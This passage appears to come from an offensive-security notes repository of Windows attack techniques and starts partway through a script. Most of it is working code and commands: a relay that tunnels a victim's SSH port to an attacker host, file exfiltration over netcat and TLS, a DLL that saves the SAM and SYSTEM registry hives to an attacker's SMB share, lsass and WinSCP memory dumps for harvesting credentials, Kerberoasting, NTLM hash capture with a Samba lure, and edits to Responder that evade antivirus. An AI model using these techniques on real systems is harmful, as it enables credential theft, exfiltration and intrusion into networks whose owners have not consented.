print("Tunnel connection received from {}".format(t_caddr))
print "Start your local application and connect to " + a_host + " on port " + str(a_port)

a_socket.listen(1)
a_conn, a_caddr = a_socket.accept()
print "Application connection received"

t_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
a_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))

while True:
   sock_list = [t_conn, a_conn]
   read_sock, write_sock, error_sock = socksel.select(sock_list , sock_list, sock_list)
   t = 0
   for sock in read_sock:
       if(sock == t_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            a_conn.send(data)
         else:
            sys.exit()
       if(sock == a_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            t_conn.send(data)
         else:
            sys.exit()
   if(t == 0):
      sleep(0.01)
```

Powershell script `tcprelay.ps1`<br />
```powershell
# Target parameters
$tcpTHost = "192.168.100.109"
$tcpTPort = "22"

# Attacker parameters
$tcpAHost = "192.168.1.19"
$tcpAPort = "4444"

try {
   $tcpAClient = New-Object System.Net.Sockets.TcpClient($tcpAHost, $tcpAPort)
}
catch {
   Write-Output "Failed to connect to attacking host"
   exit
}

try {
   $tcpTClient = New-Object System.Net.Sockets.TcpClient($tcpTHost, $tcpTPort)
}
catch {
   Write-Output "Failed to connect to target host"
   exit
}

$TStream = $tcpTClient.GetStream()
$AStream = $tcpAClient.GetStream()

$TBuffer = New-Object Byte[] $tcpTClient.ReceiveBufferSize
$ABuffer = New-Object Byte[] $tcpAClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpTClient.Connected -and $tcpAClient.Connected)
   {
      if(($tcpTClient.Client.Available -gt 0) -or ($tcpAClient.Client.Available -gt 0))
      {
         if($tcpTClient.Client.Available -gt 0)
         {
            $TRead = $TStream.Read($TBuffer, 0, $TBuffer.Length)
            $AStream.Write($TBuffer, 0, $TRead)
            $idle = 0
         }
         if($tcpAClient.Client.Available -gt 0)
         {
            $ARead = $AStream.Read($ABuffer, 0, $ABuffer.Length)
            $TStream.Write($ABuffer, 0, $ARead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpTClient.Close()
            $tcpAClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

Start `apprelay.py` on the attacking machine.

Execute `powershell -File tcprelay.ps1` on the Windows host.

When `apprelay.py` indicates that you can start your local application execute `ssh user@localhost -p 2222`.

## >> Downloading files with compiled Javascript

First, as administrator, register the System .NET assembly.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe System.dll`

As ordinary user, perform the following steps.  Create a javascript file, dl.js.

```javascript
var strURL = "http://download.domain.com/file.bin";
var strFilePath = "C:\\folder\\file.bin";
var oWebClient = new ActiveXObject("System.Net.WebClient");
oWebClient.DownloadFile(strURL, strFilePath);
```

Compile dl.js into an exe.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe dl.js`

Now execute `dl.exe` to retrieve the file.

## >> Downloading files with compiled C#

Create csharp file, dl.cs.

```
using System.Net;

namespace dlfile
{
   class dl
   {
      static void Main()
      {
         string URL = "http://download.domain.com/file.bin";
         string FilePath = "C:\\folder\\file.bin";
         WebClient WC = new WebClient();
         WC.DownloadFile(URL, FilePath);
      }
   }
}
```

Compile the program.

`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:c:\folder\dl.exe c:\folder\dl.cs`

Execute `dl.exe` to retrieve the file.

## >> Uploading a file via powershell

Start netcat listener on Linux (10.192.103.49).<br />
`nc -nlvp 4444 | fold -w 76 | base64 -d > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 4444);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$socket.close();
```

**Send file over a TLS socket**

Start openssl server on Linux (10.192.103.49).<br />
Generate a certificate and key first.<br />
`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`

`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 | fold -w 76 | base64 -di > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 443);
$stream = $socket.GetStream();
$callback = { param($sender, $cert, $chain, $errors) return $true };
$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
$sslstream.AuthenticateAsClient("whatever");
$stream = $sslstream;
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$writer.close();
$stream.close();
$socket.close();
```

## >> Downloading a file via powershell

Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
```powershell
$fdata = "";
$fname = $env:temp + "\file.bin";
$ErrorActionPreference = 'SilentlyContinue';
while($true)
{
   $socket = New-Object system.Net.Sockets.TcpClient;
   $socket.Connect('10.192.103.49', '4444');
   if($socket.Connected)
   {
      break;
   }
   Start-Sleep -Seconds 1;
}
$stream = $socket.GetStream();
$reader = new-object System.IO.StreamReader($stream);
$res = $reader.ReadToEnd();
$fdata = "$fdata$res"
$bytes = [Convert]::FromBase64String($fdata)
[IO.File]::WriteAllBytes($fname, $bytes)
$reader.close();
$stream.close();
$socket.close();
exit;
```

Start netcat listener on Linux (10.192.103.49) to serve the file.<br />
`cat file.bin | base64 | timeout 10 nc -nlvp 4444`

**Receive file over a TLS socket**

Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
```powershell
$fdata = "";
$fname = $env:temp + "\file.bin";
$ErrorActionPreference = 'SilentlyContinue';
while($true)
{
   $socket = New-Object system.Net.Sockets.TcpClient;
   $socket.Connect('10.192.103.49', '443');
   if($socket.Connected)
   {
      break;
   }
   Start-Sleep -Seconds 1;
}
$stream = $socket.GetStream();
$callback = { param($sender, $cert, $chain, $errors) return $true };
$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
$sslstream.AuthenticateAsClient("whatever", $null, "tls12", $false);
$stream = $sslstream;
$reader = new-object System.IO.StreamReader($stream);
$res = $reader.ReadToEnd();
$fdata = "$fdata$res";
$bytes = [Convert]::FromBase64String($fdata);
[IO.File]::WriteAllBytes($fname, $bytes);
$reader.close();
$stream.close();
$socket.close();
exit;
```

Start openssl server on Linux (10.192.103.49).<br />
Generate a certificate and key first.<br />
`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`

`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 < <(cat file.bin | base64)`

## >> Reg.exe DLL equivalent to dump registry hashes

Compile your own DLL to dump the SAM, SYSTEM and SECURITY keys, which can be used with secretsdump.py to get NTLM hashes.  Performs the equivalent of:<br />
`reg save hklm\sam sam`<br />
`reg save hklm\system system`<br />
`reg save hklm\security security`<br />

**Create a DLL regsave.dll from source regsave.c**

```c
#include <windows.h>

void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
   // set your export paths here
   LPCWSTR wsSam = L"\\\\192.168.1.242\\upload\\sam";
   LPCWSTR wsSystem = L"\\\\192.168.1.242\\upload\\system";
   LPCWSTR wsSecurity = L"\\\\192.168.1.242\\upload\\security";
   HANDLE hToken;
   TOKEN_PRIVILEGES tp;
   LUID luid;
   HKEY hKey;

   if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
   {
      if(LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &luid))
      {
         tp.PrivilegeCount = 1;
         tp.Privileges[0].Luid = luid;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         if(AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL))
         {
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSam, NULL);
               RegCloseKey(hKey);
            }
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSystem, NULL);
               RegCloseKey(hKey);
            }
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SECURITY", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSecurity, NULL);
               RegCloseKey(hKey);
            }
         }
      }
   }
}
```

Compile the DLL.<br />
`i686-w64-mingw32-gcc -shared -Wl,--kill-at regsave.c -o regsave.dll`

Execute the exported function on the target host.<br />
`rundll32.exe regsave.dll,RegSave`

On Linux, recover the hashes from the exported files.<br />
`secretsdump.py -system system -sam sam -security security LOCAL`

## >> Dumping lsass.exe using comsvcs.dll

**Powershell method**

Assumes administrator, will acquire SeDebugPrivilege right.<br />
```powershell
$DumpFile = "C:\WINDOWS\Temp\lsass.dmp"
$ProcessId = $pid

$definition = @'
using System;
using System.Runtime.InteropServices;
public class AdjPriv
{
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
  [DllImport("advapi32.dll", SetLastError = true)] internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
  [StructLayout(LayoutKind.Sequential, Pack = 1)] internal struct TokPriv1Luid
  {
    public int Count;
    public long Luid;
    public int Attr;
  }
  internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
  internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
  internal const int TOKEN_QUERY = 0x00000008;
  internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
  public static bool EnablePrivilege(long processHandle, string privilege, bool disable)
  {
    bool retVal;
    TokPriv1Luid tp;
    IntPtr hproc = new IntPtr(processHandle);
    IntPtr htok = IntPtr.Zero;
    retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
    tp.Count = 1;
    tp.Luid = 0;
    if(disable)
    {
      tp.Attr = SE_PRIVILEGE_DISABLED;
    }
    else
    {
      tp.Attr = SE_PRIVILEGE_ENABLED;
    }
    retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
    retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    return retVal;
  }
}
'@
$processHandle = (Get-Process -id $ProcessId).Handle
[bool] $Disable = $false
$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege($processHandle, "SeDebugPrivilege", $Disable)
$lsass = Get-Process -Name lsass
$sig = @'
[DllImport("comsvcs.dll", EntryPoint = "MiniDumpW", CharSet = CharSet.Unicode)]
public static extern void MiniDumpW(string ignored1, string ignored2, string pid_path_mode);
'@
$dmp = Add-Type -memberDefinition $sig -name "MiniDump" -namespace Win32Functions -passThru
$parameters = $lsass.Id.ToString() + " " + $DumpFile + " full"
$dmp::MiniDumpW(0, 0, $parameters)
```

**Using rundll32.exe**

Identify an unused service that runs as LocalSystem and reconfigure the binpath.  This example assumes the PID for lsass.exe is 432.<br />
```
sc config ImapiService binPath= "C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 432 C:\Windows\temp\lsass.dmp full" start= demand
```

Start the service.  It will error but check for output in C:\Windows\temp\lsass.dmp.

Restore the configuration of the unused service.<br />
```
sc config ImapiService binPath= "C:\WINDOWS\system32\imapi.exe" start= disabled
```

## >> Dumping WinSCP passwords from memory using comsvcs.dll

Assumes attacking host 10.1.2.3 has an anonymous writable SMB share to receive the dmp file.<br />
Assumes a command prompt with administrator privileges has been acquired on the target.<br />
```
wmic process where name^="winscp.exe" get Processid | findstr /r /c:"[0-9]" > %TEMP%\winscp.pid

set /p varpid= < %TEMP%\winscp.pid

del %TEMP%\winscp.pid

set varpid=%varpid: =%

C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %varpid% %TEMP%\winscp.dmp full

timeout /t 5 && move /y %TEMP%\winscp.dmp \\10.1.2.3\smbwrite
```
Search for credentials in winscp.dmp on the attacking host.<br />
`strings winscp.dmp | grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | more`

Example output:<br />
`user192.168.20.33Lam3Password!`

## >> Targeted Kerberoasting using LOLbin programs

Assumes you have (compromised) a Windows computer that can access the domain with user privileges and have local administrator privileges to run `netsh`.

**List all user accounts with SPNs under a specific OU**

`dsquery * "OU=Service Accounts,DC=my,DC=lab" -filter "(&(objectcategory=user) (servicePrincipalName=*))" -attr distinguishedName servicePrincipalName -limit 0 > C:\temp\spn_accounts.txt`

Look through the file `C:\temp\spn_accounts.txt` for an interesting account and note the `distinguishedName` and `servicePrincipalName`.<br />
(e.g.)<br />
```
distinguishedName:    CN=Admin Service,OU=Services Accounts,DC=my,DC=lab
servicePrincipalName: http/automation;http/automation.my.lab;
```
**Get the IP addresses of the Domain Controllers**

`nslookup -type=all _ldap._tcp.dc._msdcs.my.lab`

(e.g.)<br />
```
dc01.my.lab    internet address = 10.1.2.10
dc02.my.lab    internet address = 10.1.2.11
```

**Clear the Kerberos tickets on the host**

`klist purge`

**Start a packet capture using netsh from en elevated command prompt**

(filter the packet trace to just the DCs identified earlier)<br />
`netsh trace start scenario=NetConnection capture=yes persistent=no maxsize=512 filemode=circular overwrite=yes report=no correlation=no traceFile=c:\temp\capture.etl IPv4.Address=(10.1.2.10,10.1.2.11) Ethernet.Type=IPv4`<br />
wait for the command prompt to return.

**Get a kerberos TGS using the SPN**

`klist get http/automation.my.lab`

**Stop the packet capture from the elevated command prompt**

`netsh trace stop`<br />
wait for the command prompt to return.

**The remaining steps are performed off-host on an attacking Windows system**

(1) Copy `c:\temp\capture.etl` to the attack system.<br />
(2) Ensure the attack system has the following tools installed.<br />
    [etl2pcapng](https://github.com/microsoft/etl2pcapng)<br />
    [NetworkMiner >= 2.6](https://www.netresec.com)<br />
    [WireShark](https://www.wireshark.org/)<br />
(3) Convert the netsh file to pcapng format.<br />
    `etl2pcapng.exe capture.etl capture.pcapng`<br />
(4) Open the `capture.pcapng` file in WireShark and save as a classic pcap file `capture.pcap`.  Discard comments when saving if prompted to do so.<br />
(5) Open `capture.pcap` in NetworkMiner.  Under the "Credentials" tab right-click on the krb5tgs entry and select "Copy Password".  Save the text from the clipboard into a file called "tgs.txt".<br />
(6) The encryption type at the beginning of the string pasted into the "tgs.txt" file will tell you if the ticket was encrypted with RC4 or AES.<br />
(e.g)<br />
```
$krb5tgs$23$ = RC4     = hashcat mode 13100
$krb5tgs$17$ = AES-128 = hashcat mode 19600
$krb5tgs$18$ = AES-256 = hashcat mode 19700
```
(7) Feed the contents of "tgs.txt" into hashcat to attempt to crack the service account's plaintext password.

## >> NetBIOS Name Service Recon Without Windows Utilities

Attacking machine is Linux that has netcat or bash UDP device support.  Windows host 192.168.1.166 is being queried in this example.

**Using nc**

`echo -n 12340000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001 | xxd -r -p | nc -u -w 1 192.168.1.166 137 | strings`

Same technique using a random transaction ID:

`(echo -n $(openssl rand -hex 2); echo -n 0000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001) | xxd -r -p | nc -u -w 1 192.168.1.166 137 | strings`

**Using bash UDP device**

`exec 5<>/dev/udp/192.168.1.166/137; echo -n 12340000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001 | xxd -r -p >&5; timeout 1 strings <&5`

Same technique using a random transaction ID:

`exec 5<>/dev/udp/192.168.1.166/137; (echo -n $(openssl rand -hex 2); echo -n 0000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001) | xxd -r -p >&5; timeout 1 strings <&5`

## >> Capturing NTLM hashes with Samba and tcpdump

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with NTLM credential grabbing attacks using `Responder.py`, try this.  This assumes your attacking computer and victim computer are in the same DNS namespace.  The victim can be either a domain-joined computer or standalone workgroup.  This example uses the my.lab domain and the Samba server is smb.my.lab.

**Setup a minimal Samba server**

Edit `/etc/samba/smb.conf`<br />
```
[global]
workgroup = WORKGROUP
server role = standalone server
map to guest = bad user
security = user
lanman auth = no
ntlm auth = no
ntlmv2 auth = yes
[files]
path = /samba
browseable = yes
read only = yes
guest ok = yes
force user = nobody
```

Create the folder and file that the victim will access.<br />
```
mkdir /samba
chmod 777 /samba
chown nobody /samba
echo "this is a test" > /samba/test.txt
```

Start the Samba server and capture packets.<br />
```
service smbd start
tcpdump -nn -vv -i eth0 -s 0 -w ntlm.cap port 445 or port 139
```

Lure the victim to access your file `\\smb.my.lab\files\test.txt` or exploit a zero-click vulnerability.

Type `<ctrl>-c` to stop tcpdump and stop the Samba service when you have collected enough packets.  Then open the ntlm.cap file in NetworkMiner.  Go to the "credentials" tab and select the NTLMv2 response packet.  Right-click then copy password, save it in a text file then right-click copy username.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/nm01.png)

Convert the NTLM hash that looks like this:<br />
`$NETNTLMv2$WIN10PRO$<hex>$<hex>$<hex>`

To something like this:<br />
`Administrator::WIN10PRO:<hex>:<hex>:<hex>`

Crack the converted hash string using hashcat mode 5600 to attempt to recover the plaintext password.

## >> Modifying Responder.py to evade AV detection

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with HTTP NTLM credential grabbing attacks using `Responder.py`, try this.  Tested with Responder version 3.0.2.0.

**Clone and edit Responder**

```
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/lgandx/Responder
cd Responder
```

Edit `Responder.conf` to serve a 1x1 pixel png file.

```
under "; Servers to start"
    set all to Off except HTTP
under "; Specific NBT-NS/LLMNR names to respond to"
    set RespondToName = DONOTRESPOND
under "; HTML answer to inject in HTTP responses"
    set HTMLToInject = <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAABhGlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mloq0ONhBxCFDdbIgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfEydFJ0UVK/C4ptIjxjuMe3vvel7vvAKFZZZrVMw5oum1mUkkxl18Vw6+I0AwhiqjMLGNOktLwHV/3CPD9LsGz/Ov+HFG1YDEgIBLPMsO0iTeIpzdtg/M+cYyVZZX4nHjMpAsSP3Jd8fiNc8llgWfGzGxmnjhGLJa6WOliVjY14iniuKrplC/kPFY5b3HWqnXWvid/YaSgryxzndYwUljEEiSIUFBHBVXYSNCuk2IhQ+dJH/+Q65fIpZCrAkaOBdSgQXb94H/wu7dWcXLCS4okgdCL43yMAOFdoNVwnO9jx2mdAMFn4Erv+GtNYOaT9EZHix8B/dvAxXVHU/aAyx1g8MmQTdmVgrSEYhF4P6NvygMDt0Dfmte39jlOH4As9Sp9AxwcAqMlyl73eXdvd9/+rWn37wfzwXJ0GXT1kgAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAAxJREFUCNdjOHbsGAAEqAJTHAqdsQAAAABJRU5ErkJggg==">
```

Edit `packets.py` and change every instance of `Microsoft-IIS/7.5` to `Apache/2.2.15`.<br />
If using `vi` search and replace `:%s/Microsoft-IIS\/7.5/Apache\/2.2.15/g`

Clear the cache and logs<br />
```
rm Responder.db
rm logs/*
```

Launch Responder.<br />
`python2 ./Responder.py -I wlan0`

Lure the victim to request the URL, where www.my.lab is the attacking host running Responder.<br />
(e.g.) `http://www.my.lab/images/image.png`

## >> Memory Dumping with C#

Many are familiar with dumping lsass to get Windows credentials.  However, user mode processes are a credential goldmine as well (mail clients, VPN clients, file transfer clients, terminal emulators, password managers, etc).  If the application doesn't employ defensive programming, such as encrypting or clearing stack and heap variables, chances are good that you can detect user names, passwords, private keys, tokens, and so on.  Once you have a Windows process dump file you can use several Linux tools to inspect the data:

```
strings <dump file>
strings -e l <dumpfile>
binwalk <dump file>
```

The following program `jamd.cs` can be compiled with Windows CSharp compiler (csc.exe) like so.<br />
`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\jamd.exe C:\temp\jamd.cs`

The program can be executed like this `C:\temp\jamd.exe 1234 c:\temp\proc.dmp`

```csharp
// Just Another Memory Dumper

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Jamd
{
   class JamdProgram
   {
      private const int MiniDumpWithFullMemory = 0x00000002;

      [DllImport("dbghelp.dll", SetLastError = true)]
      static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeHandle hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

      private static void DumpMem(IntPtr hProc, int PID, string DumpFile)
      {
         try
         {
            bool status;

            using(FileStream fs = new FileStream(DumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
               status = MiniDumpWriteDump(hProc, PID, fs.SafeFileHandle, MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            if(status)
            {
               Console.WriteLine("Dump of PID {0} saved to {1}", PID, DumpFile);
            }
            else
            {
               Console.WriteLine("Process memory dump failed.");
            }
         }
         catch(Exception ex)
         {
            Console.WriteLine("DumpMem failed, error: {0}", ex.Message);
         }
      }

      private static void Main(string[] args)
      {
         try
         {
            if(args.Length != 2)
            {
               Console.WriteLine("Usage: jamd.exe <PID> <dump file>");
            }
            else
            {
               int pid = Convert.ToInt32(args[0]);
               string dumpfile = String.Copy(args[1]);
               try
               {
                  Process process = Process.GetProcessById(pid);
                  DumpMem(process.Handle, pid, dumpfile);
               }
               catch(Exception ex)
               {
                  Console.WriteLine("Jamd failed, error: {0}", ex.Message);
               }
            }
         }
         catch(Exception ex)
         {
            Console.WriteLine("Jamd failed, error: {0}", ex.Message);
         }
      }
   }
}
```

## >> Interactive Command Prompt with WinRM

An interactive instance of cmd.exe is not directly supported under a remote Powershell session.  You can use named pipes to redirect stdin, stdout and sterr to interact with the command interpreter through multiple WinRM consoles.  Three consoles are used in this example.

* First PsSession will be used to capture the input of cmd.exe
* Second PsSession will be used to capture the output of cmd.exe
* Third PsSession will be used to launch cmd.exe with redirection to your named pipes

**Launch three instances of Powershell**

On the client computer you will need to connect to the remote computer using the following command.  Assumes the remote computer has address 192.168.1.243, has a hostname of WIN10PRO, and you are the administrator.

`Enter-PSSession -ComputerName 192.168.1.243 -Credential WIN10PRO\administrator`

Each of the 3 Powershell sessions should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm00.png)

In the first session paste the following code that will receive your input to the command interpreter.

```powershell
$host.UI.RawUI.WindowTitle = "Input Window"
$pipesec = New-Object System.IO.Pipes.PipeSecurity;
$pipeacl = New-Object System.IO.Pipes.PipeAccessRule("Everyone", "ReadWrite", "Allow");
$pipesec.AddAccessRule($pipeacl);
$pipe = new-object System.IO.Pipes.NamedPipeServerStream("cmdpipein", "Out", 2, "Byte", "None", 1024, 1024, $pipesec);
$pipe.WaitForConnection();
$sw = new-object System.IO.StreamWriter($pipe);
$sw.AutoFlush = $true;
while($true)
{
   $c = Read-Host;
   if($c -eq "killme")
   {
      $sw.WriteLine("echo killme");
      Start-Sleep -s 2
      $sw.WriteLine("exit");
      Start-Sleep -s 2
      $sw.Dispose();
      $pipe.Dispose();
      break;
   }
   else
   {
      $sw.WriteLine($c);
   }
}
```

In the second session paste the following code that will display the output from the command interpreter.

```powershell
$host.UI.RawUI.WindowTitle = "Output Window"
$pipesec = New-Object System.IO.Pipes.PipeSecurity;
$pipeacl = New-Object System.IO.Pipes.PipeAccessRule("Everyone", "ReadWrite", "Allow");
$pipesec.AddAccessRule($pipeacl);
$s = $true;
while($s)
{
   $pipe = new-object System.IO.Pipes.NamedPipeServerStream("cmdpipeout", "In", 2, "Byte", "None", 1024, 1024, $pipesec);
   $pipe.WaitForConnection();
   $sr = new-object System.IO.StreamReader($pipe);
   while(($data = $sr.ReadLine()) -ne $null)
   {
      if($data -eq "killme")
      {
         $sr.Dispose();
         $pipe.Dispose();
         Write-Host "Killing session";
         $s = $false;
         break;
      }
      else
      {
         Write-Host $data;
      }
   }
   $pipe.Dispose();
}
```

In the third session paste the following code.  This launches the instance of cmd.exe with redirection to the named pipes you created in the first two sessions.  Since you will not be interacting with this session it can be ignored after the command is executed.

```powershell
$host.UI.RawUI.WindowTitle = "Command Start - Noninteractive"
& cmd.exe /c "cmd.exe <\\.\pipe\cmdpipein >\\.\pipe\cmdpipeout 2>&1"
```

**Example of Using the Consoles**

The noninteractive window used to launch cmd.exe should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm03.png)

The window used to enter commands should resemble this.  Enter the keyword "killme" to exit the scripts and destroy the named pipes.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm01.png)

The window used to see the command output should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm02.png)
